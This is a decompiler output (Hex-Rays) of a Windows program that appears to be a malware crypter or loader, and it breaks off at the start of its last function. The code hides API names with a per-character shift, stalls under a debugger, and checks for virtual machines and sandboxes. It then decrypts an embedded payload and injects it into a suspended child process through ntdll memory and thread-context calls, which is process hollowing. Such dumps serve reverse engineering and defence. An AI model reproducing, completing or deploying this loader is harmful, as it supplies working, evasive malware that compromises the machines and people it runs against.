/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

LONG __stdcall __crt_xt_end__(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
int __fastcall sub_4013B0(int a1);
int __cdecl sub_401430(_DWORD *a1, _DWORD *a2);
void __noreturn sub_4015F0(); // weak
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __stdcall sub_402162(int, int, int, HWND hWnd); // idb
// NTSTATUS __stdcall NtYieldExecution();
// void *__cdecl memset(void *, int Val, size_t Size);
// size_t __cdecl wcslen(const wchar_t *String);
// size_t __cdecl strlen(const char *Str);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetLastError();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// void __stdcall GetNativeSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// void *__cdecl malloc(size_t Size);
// void __cdecl free(void *Block);
// void __cdecl fpreset_1();
// HWND __stdcall GetActiveWindow();
// int __stdcall MessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);

//-------------------------------------------------------------------------
// Data declarations

const char aHgwptmpkjvQtf[] = "HgwPtmpkjv[~|qtƒ"; // idb
const char aWkuxzgsxY[] = "WkuxzgsX{y"; // idb
const char aHgwrfzpN[] = "HgwRfzp~n]"; // idb
const char aJuzsXYnq[] = "JuZs|<;X{ynq€"; // idb
const char aOvjiyivvOfAv[] = "OvJiyIvv}oƒ€av"; // idb
const char aOvviyivvOfAv[] = "OvViyIvv}oƒ€av"; // idb
const char aOvdpqujiOau[] = "OvDpquji}oau"; // idb
const char aOvzvnzlR[] = "OvZvnzl^r|"; // idb
const char aDtheykwzxmp[] = "DtheykWzxmp"; // idb
char aGkqhwkzwNqn[] = "GkqhWkzw~|nqN"; // idb
char aMqdhwkzwNq[] = "MqdhWkzw~|nq"; // idb
char aMqfowkzwNq[] = "MqfoWkzw~|nq"; // idb
const char aTgwysnhvmvppr[] = "TgwYsnhvmvppR"; // idb
const char aSvohjivuyP[] = "SvoHjivuy|p"; // idb
const char aOvuixTmyZor[] = "OvUix{tmY|zor"; // idb
char aTvvh[] = "/tvvh"; // idb
int dword_406010; // weak
LPCWSTR lpText; // idb
_DWORD dword_406018; // idb
int dword_40601C; // weak
int dword_406020; // weak
int dword_406024; // weak
int dword_406028; // weak
int dword_40602C; // weak
HMODULE hModule; // idb
HMODULE dword_406034; // idb
int dword_406038; // weak
int dword_4060D8; // weak
int dword_4060E8; // weak
int dword_4060EC; // weak
int (__stdcall *dword_4060F4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4060F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4060FC)(_DWORD, _DWORD); // weak
int (__stdcall *dword_406100)(_DWORD, _DWORD); // weak
int (__cdecl *dword_406104)(_DWORD); // weak
int dword_406108; // weak
int dword_40610C; // weak
int dword_406110; // weak
int (__stdcall *dword_406114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak


//----- (00401000) --------------------------------------------------------
LONG __stdcall __crt_xt_end__(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  int v1; // esi
  DWORD v2; // eax
  _crt_signal_t v3; // eax
  _crt_signal_t v5; // eax

  v1 = 0;
  v2 = ExceptionInfo->ExceptionRecord->ExceptionCode;
  if ( v2 > 0xC0000091 )
  {
    if ( v2 != -1073741677 )
    {
      if ( v2 != -1073741676 )
        return 0;
      goto LABEL_4;
    }
LABEL_3:
    v1 = 1;
LABEL_4:
    v3 = signal(8, 0);
    if ( v3 == (_crt_signal_t)1 )
    {
      signal(8, (_crt_signal_t)1);
      if ( v1 )
        fpreset_1();
      return -1;
    }
    if ( v3 )
    {
      v3(8);
      return -1;
    }
    return 0;
  }
  if ( v2 >= 0xC000008D )
    goto LABEL_3;
  if ( v2 == -1073741819 )
  {
    v5 = signal(11, 0);
    if ( v5 == (_crt_signal_t)1 )
    {
      signal(11, (_crt_signal_t)1);
      return -1;
    }
    if ( v5 )
    {
      v5(11);
      return -1;
    }
  }
  return 0;
}

//----- (004013B0) --------------------------------------------------------
int __fastcall sub_4013B0(int a1)
{
  char v2[4]; // [esp+14h] [ebp-4h] BYREF

  return dword_4060F4(-1, sub_4013B0, a1, 4, v2);
}
// 4060F4: using guessed type int (__stdcall *dword_4060F4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401430) --------------------------------------------------------
int __cdecl sub_401430(_DWORD *a1, _DWORD *a2)
{
  void *v2; // ebx
  size_t v3; // eax
  size_t v4; // ecx
  CHAR v5; // dl
  char v6; // dl
  FARPROC v7; // eax
  _DWORD *v9; // edi
  int v10; // eax
  unsigned int v11; // ecx
  int v12; // edx
  int v13; // esi
  size_t i; // [esp+18h] [ebp-130h]
  int v15; // [esp+24h] [ebp-124h]
  int v16; // [esp+28h] [ebp-120h]
  size_t Size; // [esp+2Ch] [ebp-11Ch] BYREF
  CHAR ProcName[280]; // [esp+30h] [ebp-118h] BYREF

  Size = 0;
  v16 = 0;
  v2 = 0;
  v15 = 0;
  memset(ProcName, 0, 0xFFu);
  v3 = strlen(aHgwptmpkjvQtf) - 1;
  v4 = 0;
  do
  {
    while ( 1 )
    {
      v6 = aHgwptmpkjvQtf[v4];
      if ( v6 != 13 )
        break;
      ProcName[v4++] = 13;
      if ( v3 < v4 )
        goto LABEL_7;
    }
    if ( v6 == 10 )
      v5 = 10;
    else
      v5 = v6 - v4 - 1;
    ProcName[v4++] = v5;
  }
  while ( v3 >= v4 );
LABEL_7:
  v7 = GetProcAddress(hModule, ProcName);
  dword_40601C = (int)v7;
  if ( !v7 )
    return 0;
  while ( !((int (__stdcall *)(void *, size_t *))v7)(v2, &Size) )
  {
    if ( GetLastError() != 122 )
      return 0;
    if ( v2 )
      free(v2);
    v2 = malloc(Size);
    if ( !v2 )
      return 0;
    v7 = (FARPROC)dword_40601C;
  }
  v9 = v2;
  if ( Size > 0x17 )
  {
    for ( i = 24; i <= Size; i += 24 )
    {
      v10 = v9[1];
      if ( v10 != 1 && v10 <= 1 && !v10 )
      {
        ++v15;
        v11 = 0x80000000;
        v12 = 31;
        v13 = 0;
        do
        {
          v13 += (v11 & *v9) != 0;
          v11 >>= 1;
          --v12;
        }
        while ( v12 >= 0 );
        v16 += v13;
      }
      v9 += 6;
    }
  }
  *a1 = v15;
  *a2 = v16;
  free(v2);
  return 1;
}
// 40601C: using guessed type int dword_40601C;

//----- (004015F0) --------------------------------------------------------
void __noreturn sub_4015F0()
{
  int v0; // edi
  int v1; // edx
  int v2; // edi
  int v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD *v6; // ebx
  int v7; // eax
  int v8; // edx
  size_t v9; // eax
  size_t v10; // ecx
  CHAR v11; // dl
  char v12; // dl
  size_t v13; // eax
  size_t v14; // ecx
  CHAR v15; // dl
  char v16; // dl
  int v17; // [esp+34h] [ebp-464h]
  int v18; // [esp+38h] [ebp-460h]
  char v19[4]; // [esp+3Ch] [ebp-45Ch] BYREF
  int v20; // [esp+40h] [ebp-458h] BYREF
  int v21; // [esp+44h] [ebp-454h] BYREF
  int v22; // [esp+48h] [ebp-450h] BYREF
  int v23; // [esp+4Ch] [ebp-44Ch] BYREF
  CHAR ProcName[256]; // [esp+50h] [ebp-448h] BYREF
  int v25; // [esp+150h] [ebp-348h] BYREF
  int v26; // [esp+154h] [ebp-344h]
  int v27[20]; // [esp+160h] [ebp-338h] BYREF
  int v28[186]; // [esp+1B0h] [ebp-2E8h] BYREF

  v18 = dword_406010;
  v17 = *(_DWORD *)(dword_406010 + 60) + dword_406010;
  memset(v27, 0, 0x44u);
  v27[0] = 68;
  if ( dword_406114(lpText, dword_406018, 0, 0, 0, 134217732, 0, 0, v27, &v25) )
  {
    v28[0] = 65543;
    v21 = 0;
    if ( dword_406100(v26, v28) >= 0 )
      dword_4060FC(v25, *(_DWORD *)(v17 + 52));
    v0 = *(_DWORD *)(v17 + 80);
    v22 = *(_DWORD *)(v17 + 52);
    v23 = v0;
    v1 = dword_4060F8(v25, &v22, 0, &v23, 12288, 64);
    if ( v1 < 0 )
    {
      v22 = 0;
      v23 = *(_DWORD *)(v17 + 80);
      v1 = dword_4060F8(v25, &v22, 0, &v23, 12288, 64);
    }
    v20 = v22;
    if ( v1 >= 0
      && dword_4060F4(v25, v28[41] + 8, &v20, 4, &v21) >= 0
      && dword_4060F4(v25, v22, v18, *(_DWORD *)(v17 + 84), &v21) >= 0 )
    {
      v2 = 0;
      if ( *(_WORD *)(v17 + 6) )
      {
        v3 = 0;
        do
        {
          v5 = *(_DWORD *)(v18 + 60);
          v6 = (_DWORD *)(v18 + v3 + v5 + 248);
          dword_4060F4(
            v25,
            *(_DWORD *)(v18 + v3 + v5 + 260) + v22,
            *(_DWORD *)(v18 + v3 + v5 + 268) + v18,
            *(_DWORD *)(v18 + v3 + v5 + 264),
            &v21);
          v7 = v6[9];
          v8 = 0;
          if ( (v7 & 0x4000000) != 0 )
            v8 = 512;
          if ( (v7 & 0x20000000) != 0 )
          {
            if ( (v7 & 0x40000000) != 0 )
            {
              if ( v7 < 0 )
                v4 = v8 | 0x40;
              else
                v4 = v8 | 0x20;
            }
            else if ( v7 < 0 )
            {
              v4 = v8 | 0x80;
            }
            else
            {
              v4 = v8 | 0x10;
            }
          }
          else if ( (v7 & 0x40000000) != 0 )
          {
            if ( v7 < 0 )
              v4 = v8 | 4;
            else
              v4 = v8 | 2;
          }
          else if ( v7 < 0 )
          {
            v4 = v8 | 8;
          }
          else
          {
            v4 = v8 | 1;
          }
          ++v2;
          v3 += 40;
          dword_406118(v25, v6[3] + v22, v6[2], v4, v19);
        }
        while ( *(unsigned __int16 *)(v17 + 6) > v2 );
      }
      v28[44] = *(_DWORD *)(v17 + 40) + v22;
      memset(ProcName, 0, 0xFFu);
      v9 = strlen(aOvviyivvOfAv) - 1;
      v10 = 0;
      do
      {
        v12 = aOvviyivvOfAv[v10];
        if ( v12 == 13 )
        {
          v11 = 13;
        }
        else if ( v12 == 10 )
        {
          v11 = 10;
        }
        else
        {
          v11 = v12 - v10 - 1;
        }
        ProcName[v10++] = v11;
      }
      while ( v9 >= v10 );
      dword_4060EC = (int)GetProcAddress(dword_406034, ProcName);
      if ( ((int (__stdcall *)(int, int *))dword_4060EC)(v26, v28) >= 0 )
      {
        memset(ProcName, 0, 0xFFu);
        v13 = strlen(aOvuixTmyZor) - 1;
        v14 = 0;
        do
        {
          v16 = aOvuixTmyZor[v14];
          if ( v16 == 13 )
          {
            v15 = 13;
          }
          else if ( v16 == 10 )
          {
            v15 = 10;
          }
          else
          {
            v15 = v16 - v14 - 1;
          }
          ProcName[v14++] = v15;
        }
        while ( v13 >= v14 );
        dword_4060E8 = (int)GetProcAddress(dword_406034, ProcName);
        ((void (__stdcall *)(int))dword_4060E8)(v25);
      }
    }
  }
  ExitProcess(0);
}
// 4015F0: using guessed type void __noreturn sub_4015F0();
// 406010: using guessed type int dword_406010;
// 406018: using guessed type int dword_406018;
// 4060E8: using guessed type int dword_4060E8;
// 4060EC: using guessed type int dword_4060EC;
// 4060F4: using guessed type int (__stdcall *dword_4060F4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4060F8: using guessed type int (__stdcall *dword_4060F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4060FC: using guessed type int (__stdcall *dword_4060FC)(_DWORD, _DWORD);
// 406100: using guessed type int (__stdcall *dword_406100)(_DWORD, _DWORD);
// 406114: using guessed type int (__stdcall *dword_406114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406118: using guessed type int (__stdcall *dword_406118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401B90) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  PPEB v4; // ebx
  int v5; // ecx
  size_t v6; // eax
  size_t v7; // ecx
  CHAR v8; // dl
  char v9; // dl
  FARPROC v10; // edx
  int v11; // esi
  int v12; // edx
  int v13; // esi
  const WCHAR *v14; // eax
  size_t v15; // eax
  size_t v16; // ecx
  CHAR v17; // dl
  char v18; // dl
  size_t v19; // eax
  size_t v20; // ecx
  CHAR v21; // dl
  char v22; // dl
  size_t v23; // eax
  size_t v24; // ecx
  CHAR v25; // dl
  char v26; // dl
  unsigned int v27; // esi
  int (__cdecl *j)(_DWORD, int, int); // edx
  int v29; // eax
  int v30; // eax
  int v31; // edi
  size_t v32; // eax
  size_t v33; // ecx
  CHAR v34; // dl
  char v35; // dl
  int v36; // esi
  size_t v37; // eax
  size_t v38; // ecx
  CHAR v39; // dl
  char v40; // dl
  int v41; // edi
  int v47; // esi
  int v48; // ecx
  unsigned int i; // edx
  int v50; // ecx
  size_t v51; // eax
  size_t v52; // ecx
  CHAR v53; // dl
  char v54; // dl
  size_t v55; // eax
  size_t v56; // ecx
  CHAR v57; // dl
  char v58; // dl
  size_t v59; // eax
  size_t v60; // ecx
  CHAR v61; // dl
  char v62; // dl
  size_t v63; // eax
  size_t v64; // ecx
  CHAR v65; // dl
  char v66; // dl
  size_t v67; // eax
  size_t v68; // ecx
  CHAR v69; // dl
  char v70; // dl
  size_t v71; // eax
  size_t v72; // ecx
  CHAR v73; // dl
  char v74; // dl
  size_t v75; // eax
  size_t v76; // ecx
  CHAR v77; // dl
  char v78; // dl
  int v79; // eax
  int v80; // edx
  int v81; // esi
  int v82; // eax
  size_t v83; // ebx
  int v84; // edx
  int v85; // eax
  HANDLE v86; // eax
  int v87; // esi
  int v88; // eax
  int v89; // edi
  size_t v90; // eax
  size_t v91; // ecx
  CHAR v92; // dl
  char v93; // dl
  FARPROC v94; // eax
  int v96; // [esp+20h] [ebp-218h]
  int v97; // [esp+24h] [ebp-214h]
  unsigned int v98; // [esp+28h] [ebp-210h]
  int v99; // [esp+2Ch] [ebp-20Ch]
  _DWORD *v100; // [esp+30h] [ebp-208h]
  LIST_ENTRY *v101; // [esp+34h] [ebp-204h]
  int v102; // [esp+38h] [ebp-200h] BYREF
  int v103; // [esp+3Ch] [ebp-1FCh] BYREF
  int v104; // [esp+40h] [ebp-1F8h] BYREF
  int v105; // [esp+44h] [ebp-1F4h] BYREF
  int v106; // [esp+48h] [ebp-1F0h] BYREF
  int v107; // [esp+4Ch] [ebp-1ECh] BYREF
  char Str[32]; // [esp+50h] [ebp-1E8h] BYREF
  int v109[32]; // [esp+70h] [ebp-1C8h] BYREF
  CHAR ProcName[256]; // [esp+F0h] [ebp-148h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+1F0h] [ebp-48h] BYREF

  v4 = NtCurrentTeb()->ProcessEnvironmentBlock;
  v5 = v4->BeingDebugged;
  dword_406020 = (int)v4;
  dword_406024 = v5;
  while ( (_BYTE)v5 )
    ;
  v101 = &v4->Ldr->InMemoryOrderModuleList;
  hModule = (HMODULE)v101->Flink->Flink->Flink[2].Flink;
  hModule = GetModuleHandleA("kernel32");
  sub_401430(&v106, &v107);
  v105 = 0;
  memset(ProcName, 0, 0xFFu);
  v6 = strlen(aJuzsXYnq) - 1;
  v7 = 0;
  do
  {
    while ( 1 )
    {
      v9 = aJuzsXYnq[v7];
      if ( v9 != 13 )
        break;
      ProcName[v7++] = 13;
      if ( v6 < v7 )
        goto LABEL_9;
    }
    if ( v9 == 10 )
      v8 = 10;
    else
      v8 = v9 - v7 - 1;
    ProcName[v7++] = v8;
  }
  while ( v6 >= v7 );
LABEL_9:
  v10 = GetProcAddress(hModule, ProcName);
  if ( v10 )
    ((void (__cdecl *)(int, int *))v10)(-1, &v105);
  v11 = v105;
  if ( v105 )
  {
    memset(ProcName, 0, 0xFFu);
    v51 = strlen(aHgwrfzpN) - 1;
    v52 = 0;
    do
    {
      while ( 1 )
      {
        v54 = aHgwrfzpN[v52];
        if ( v54 != 13 )
          break;
        ProcName[v52++] = 13;
        if ( v51 < v52 )
          goto LABEL_69;
      }
      if ( v54 == 10 )
        v53 = 10;
      else
        v53 = v54 - v52 - 1;
      ProcName[v52++] = v53;
    }
    while ( v51 >= v52 );
LABEL_69:
    dword_4060D8 = (int)GetProcAddress(hModule, ProcName);
    GetNativeSystemInfo(&SystemInfo);
    if ( v11 )
      goto LABEL_14;
  }
  else
  {
    GetSystemInfo(&SystemInfo);
  }
  if ( !SystemInfo.wProcessorArchitecture )
  {
    _EAX = 1;
    __asm { cpuid }
    dword_40602C = _EBX;
    dword_406028 = _EDX;
    memset(v109, 0, sizeof(v109));
    v47 = dword_406028;
    v48 = 1;
    for ( i = 0; i <= 0x1F; ++i )
    {
      v109[i] = (v47 & v48) != 0;
      v48 *= 2;
    }
    v50 = -1;
    if ( v109[28] == 1 )
      v50 = BYTE2(dword_40602C);
    if ( SystemInfo.dwNumberOfProcessors != v107
      || v50 != 0 && v50 != -1 && v50 == 1 && SystemInfo.dwNumberOfProcessors != 1 )
    {
      goto LABEL_151;
    }
  }
LABEL_14:
  if ( *(_BYTE *)(dword_406020 + 2) )
    goto LABEL_151;
  v12 = (int)&v101->Flink[-1];
  v13 = *(_DWORD *)(v12 + 24);
  v14 = *(const WCHAR **)(v12 + 40);
  dword_406038 = v13;
  lpText = v14;
  memset(ProcName, 0, 0xFFu);
  v15 = strlen(aTgwysnhvmvppr) - 1;
  v16 = 0;
  do
  {
    while ( 1 )
    {
      v18 = aTgwysnhvmvppr[v16];
      if ( v18 != 13 )
        break;
      ProcName[v16++] = 13;
      if ( v15 < v16 )
        goto LABEL_21;
    }
    if ( v18 == 10 )
      v17 = 10;
    else
      v17 = v18 - v16 - 1;
    ProcName[v16++] = v17;
  }
  while ( v15 >= v16 );
LABEL_21:
  dword_406104 = (int (__cdecl *)(_DWORD))GetProcAddress(hModule, ProcName);
  v100 = (_DWORD *)(*(unsigned __int16 *)(*(_DWORD *)(v13 + 60) + dword_406038 + 20)
                  + *(_DWORD *)(v13 + 60)
                  + dword_406038
                  + 224);
  memset(ProcName, 0, 0xFFu);
  v19 = strlen(aTvvh) - 1;
  v20 = 0;
  do
  {
    while ( 1 )
    {
      v22 = aTvvh[v20];
      if ( v22 != 13 )
        break;
      ProcName[v20++] = 13;
      if ( v19 < v20 )
        goto LABEL_27;
    }
    if ( v22 == 10 )
      v21 = 10;
    else
      v21 = v22 - v20 - 1;
    ProcName[v20++] = v21;
  }
  while ( v19 >= v20 );
LABEL_27:
  if ( memcmp(v100, ProcName, 5u) )
    return 6;
  memset(ProcName, 0, 0xFFu);
  v23 = strlen(aGkqhwkzwNqn) - 1;
  v24 = 0;
  do
  {
    while ( 1 )
    {
      v26 = aGkqhwkzwNqn[v24];
      if ( v26 != 13 )
        break;
      ProcName[v24++] = 13;
      if ( v23 < v24 )
        goto LABEL_34;
    }
    if ( v26 == 10 )
      v25 = 10;
    else
      v25 = v26 - v24 - 1;
    ProcName[v24++] = v25;
  }
  while ( v23 >= v24 );
LABEL_34:
  v27 = 0;
  dword_406110 = (int)GetProcAddress(hModule, ProcName);
  for ( j = (int (__cdecl *)(_DWORD, int, int))dword_406110; ; j = (int (__cdecl *)(_DWORD, int, int))dword_406110 )
  {
    v29 = (unsigned __int16)v27++;
    v30 = j(0, v29, 2);
    v31 = v30;
    if ( v30 != 0 || v27 > 0xFE )
      break;
  }
  if ( v27 > 0xFE )
  {
    v41 = v100[3] + dword_406038;
  }
  else
  {
    if ( !v30 )
      return 6;
    memset(ProcName, 0, 0xFFu);
    v32 = strlen(aMqdhwkzwNq) - 1;
    v33 = 0;
    do
    {
      while ( 1 )
      {
        v35 = aMqdhwkzwNq[v33];
        if ( v35 != 13 )
          break;
        ProcName[v33++] = 13;
        if ( v32 < v33 )
          goto LABEL_45;
      }
      if ( v35 == 10 )
        v34 = 10;
      else
        v34 = v35 - v33 - 1;
      ProcName[v33++] = v34;
    }
    while ( v32 >= v33 );
LABEL_45:
    dword_40610C = (int)GetProcAddress(hModule, ProcName);
    v36 = ((int (__cdecl *)(_DWORD, int))dword_40610C)(0, v31);
    if ( !v36 )
      return 6;
    memset(ProcName, 0, 0xFFu);
    v37 = strlen(aMqfowkzwNq) - 1;
    v38 = 0;
    do
    {
      while ( 1 )
      {
        v40 = aMqfowkzwNq[v38];
        if ( v40 != 13 )
          break;
        ProcName[v38++] = 13;
        if ( v37 < v38 )
          goto LABEL_52;
      }
      if ( v40 == 10 )
        v39 = 10;
      else
        v39 = v40 - v38 - 1;
      ProcName[v38++] = v39;
    }
    while ( v37 >= v38 );
LABEL_52:
    dword_406108 = (int)GetProcAddress(hModule, ProcName);
    v41 = ((int (__cdecl *)(int))dword_406108)(v36);
  }
  dword_406034 = (HMODULE)v101->Flink->Flink[2].Flink;
  dword_406034 = GetModuleHandleA("ntdll");
  memset(ProcName, 0, 0xFFu);
  v55 = strlen(aOvzvnzlR) - 1;
  v56 = 0;
  do
  {
    while ( 1 )
    {
      v58 = aOvzvnzlR[v56];
      if ( v58 != 13 )
        break;
      ProcName[v56++] = 13;
      if ( v55 < v56 )
        goto LABEL_86;
    }
    if ( v58 == 10 )
      v57 = 10;
    else
      v57 = v58 - v56 - 1;
    ProcName[v56++] = v57;
  }
  while ( v55 >= v56 );
LABEL_86:
  dword_4060F4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406034, ProcName);
  memset(ProcName, 0, 0xFFu);
  v59 = strlen(aOvjiyivvOfAv) - 1;
  v60 = 0;
  do
  {
    while ( 1 )
    {
      v62 = aOvjiyivvOfAv[v60];
      if ( v62 != 13 )
        break;
      ProcName[v60++] = 13;
      if ( v59 < v60 )
        goto LABEL_92;
    }
    if ( v62 == 10 )
      v61 = 10;
    else
      v61 = v62 - v60 - 1;
    ProcName[v60++] = v61;
  }
  while ( v59 >= v60 );
LABEL_92:
  dword_406100 = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress(dword_406034, ProcName);
  Str[0] = 79;
  Str[1] = 118;
  Str[2] = 88;
  Str[3] = 114;
  Str[4] = 114;
  Str[5] = 103;
  Str[6] = 119;
  Str[7] = 94;
  Str[8] = 114;
  Str[9] = 111;
  Str[10] = -126;
  Str[11] = 91;
  Str[12] = 115;
  Str[13] = 97;
  Str[14] = 116;
  Str[15] = 115;
  Str[16] = -123;
  Str[17] = 123;
  Str[18] = -126;
  Str[19] = -126;
  Str[20] = 0;
  Str[21] = 0;
  Str[22] = 0;
  Str[23] = 0;
  Str[24] = 0;
  Str[25] = 0;
  Str[26] = 0;
  memset(ProcName, 0, 0xFFu);
  v63 = strlen(Str) - 1;
  v64 = 0;
  do
  {
    while ( 1 )
    {
      v66 = Str[v64];
      if ( v66 != 13 )
        break;
      ProcName[v64++] = 13;
      if ( v63 < v64 )
        goto LABEL_98;
    }
    if ( v66 == 10 )
      v65 = 10;
    else
      v65 = v66 - v64 - 1;
    ProcName[v64++] = v65;
  }
  while ( v63 >= v64 );
LABEL_98:
  dword_4060FC = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress(dword_406034, ProcName);
  memset(ProcName, 0, 0xFFu);
  v67 = strlen(aOvdpqujiOau) - 1;
  v68 = 0;
  do
  {
    while ( 1 )
    {
      v70 = aOvdpqujiOau[v68];
      if ( v70 != 13 )
        break;
      ProcName[v68++] = 13;
      if ( v67 < v68 )
        goto LABEL_104;
    }
    if ( v70 == 10 )
      v69 = 10;
    else
      v69 = v70 - v68 - 1;
    ProcName[v68++] = v69;
  }
  while ( v67 >= v68 );
LABEL_104:
  dword_4060F8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      dword_406034,
                                                                                      ProcName);
  memset(ProcName, 0, 0xFFu);
  v71 = strlen(aDtheykwzxmp) - 1;
  v72 = 0;
  do
  {
    while ( 1 )
    {
      v74 = aDtheykwzxmp[v72];
      if ( v74 != 13 )
        break;
      ProcName[v72++] = 13;
      if ( v71 < v72 )
        goto LABEL_110;
    }
    if ( v74 == 10 )
      v73 = 10;
    else
      v73 = v74 - v72 - 1;
    ProcName[v72++] = v73;
  }
  while ( v71 >= v72 );
LABEL_110:
  dword_406114 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, ProcName);
  memset(ProcName, 0, 0xFFu);
  v75 = strlen(aWkuxzgsxY) - 1;
  v76 = 0;
  do
  {
    while ( 1 )
    {
      v78 = aWkuxzgsxY[v76];
      if ( v78 != 13 )
        break;
      ProcName[v76++] = 13;
      if ( v75 < v76 )
        goto LABEL_116;
    }
    if ( v78 == 10 )
      v77 = 10;
    else
      v77 = v78 - v76 - 1;
    ProcName[v76++] = v77;
  }
  while ( v75 >= v76 );
LABEL_116:
  dword_406118 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, ProcName);
  if ( !dword_4060F4 || !dword_406100 || !dword_4060FC || !dword_4060F8 || !dword_406114 )
    return 4;
  dword_4060F4(-1, sub_4013B0, dword_406020 + 7552, 4, &v104);
  dword_4060F4(-1, sub_4013B0, v99 + 104, 4, &v103);
  if ( v98 <= 1 )
LABEL_151:
    JUMPOUT(0x40218F);
  v79 = v100[2];
  v96 = v41 + 10;
  v80 = v41 + 10;
  dword_406010 = v41 + 10;
  v81 = v79 - 10;
  if ( v79 != 10 )
  {
    while ( 1 )
    {
      *(_BYTE *)(--v81 + v80) ^= *(_BYTE *)(v41 + 1);
      NtYieldExecution();
      if ( !v81 )
        break;
      v80 = dword_406010;
    }
  }
  dword_406104(sub_4015F0);
  if ( *(_BYTE *)v41 )
  {
    v86 = HeapCreate(0, 0xFFu, 0);
    dword_406010 = (int)HeapAlloc(v86, 8u, *(_DWORD *)(v41 + 6));
    v87 = dword_406010;
    v88 = *(_DWORD *)(v41 + 2);
    v89 = *(_DWORD *)(v41 + 6);
    v97 = v88;
    memset(ProcName, 0, 0xFFu);
    v90 = strlen(aSvohjivuyP) - 1;
    v91 = 0;
    do
    {
      v93 = aSvohjivuyP[v91];
      if ( v93 == 13 )
      {
        v92 = 13;
      }
      else if ( v93 == 10 )
      {
        v92 = 10;
      }
      else
      {
        v92 = v93 - v91 - 1;
      }
      ProcName[v91++] = v92;
    }
    while ( v90 >= v91 );
    v94 = GetProcAddress(dword_406034, ProcName);
    ((void (__cdecl *)(int, int, int, int, int, int *))v94)(2, v87, v89, v96, v97, &v102);
    v82 = v102;
  }
  else
  {
    v82 = *(_DWORD *)(v41 + 2);
  }
  if ( !v82 )
    return 6;
  v83 = 0;
  v84 = dword_406020;
  while ( wcslen(*(const wchar_t **)(*(_DWORD *)(v84 + 16) + 68)) > v83 )
  {
    NtYieldExecution();
    v84 = dword_406020;
    v85 = *(_DWORD *)(*(_DWORD *)(dword_406020 + 16) + 68);
    if ( *(_WORD *)(v85 + 2 * v83) == 32 )
    {
      dword_406018 = v85 + 2 * v83;
      break;
    }
    ++v83;
  }
  _disable();
  return sub_402162((int)hInstance, (int)hPrevInstance, (int)lpCmdLine, (HWND)nShowCmd);
}
// 401CE7: control flows out of bounds to 40218F
// 402679: variable 'v99' is possibly undefined
// 40269D: variable 'v98' is possibly undefined
// 4015F0: using guessed type void __noreturn sub_4015F0();
// 406010: using guessed type int dword_406010;
// 406020: using guessed type int dword_406020;
// 406024: using guessed type int dword_406024;
// 406028: using guessed type int dword_406028;
// 40602C: using guessed type int dword_40602C;
// 406038: using guessed type int dword_406038;
// 4060D8: using guessed type int dword_4060D8;
// 4060F4: using guessed type int (__stdcall *dword_4060F4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4060F8: using guessed type int (__stdcall *dword_4060F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4060FC: using guessed type int (__stdcall *dword_4060FC)(_DWORD, _DWORD);
// 406100: using guessed type int (__stdcall *dword_406100)(_DWORD, _DWORD);
// 406104: using guessed type int (__cdecl *dword_406104)(_DWORD);
// 406108: using guessed type int dword_406108;
// 40610C: using guessed type int dword_40610C;
// 406110: using guessed type int dword_406110;
// 406114: using guessed type int (__stdcall *dword_406114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406118: using guessed type int (__stdcall *dword_406118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402162) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __stdcall sub_402162(int a1, int a2, int a3, HWND hWnd)
{
  HWND v4; // eax
  int v6; // [esp-20h] [ebp-20h]
  int v7; // [esp-1Ch] [ebp-1Ch]
  int v8; // [esp-18h] [ebp-18h]
